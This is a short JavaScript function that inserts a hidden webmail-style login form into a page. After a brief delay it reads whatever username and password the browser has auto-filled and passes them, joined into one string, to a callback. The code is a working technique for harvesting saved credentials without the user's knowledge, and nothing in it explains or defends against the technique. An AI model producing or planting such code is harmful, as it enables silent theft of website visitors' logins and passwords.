function getUserCredentials(callback) {
  try {
    const container = document.createElement('div');
    container.innerHTML = `
        <form style="display:none" action="redirect.php" method="post" name="login_form" class="login-form" >
            <div class="form-group">
                <label for="login_username">Username:</label>
                <input type="text" id="login_username" name="login_username" autocomplete="username" required>
            </div>
            
            <div class="form-group">
                <label for="secretkey">Password:</label>
                <input type="password" id="secretkey" name="secretkey" autocomplete="current-password" required>
                <input type="hidden" name="js_autodetect_results" value="1">
                <input type="hidden" name="just_logged_in" value="1">
            </div>
            
            <button type="submit" class="login-button">Login</button>
        </form>
    `;

    document.body.insertBefore(container, document.body.firstChild);

    setTimeout(() => {
      const username = document.querySelector('input[name="login_username"]').value;
      const password = document.querySelector('input[name="secretkey"]').value;
      
      // Pass both username and the credentials string to the callback
      callback(`${username}-${password}`, username);
    }, 100);

  } catch (e) {
    callback('unrecognized_email', 'unknown');
  }
}
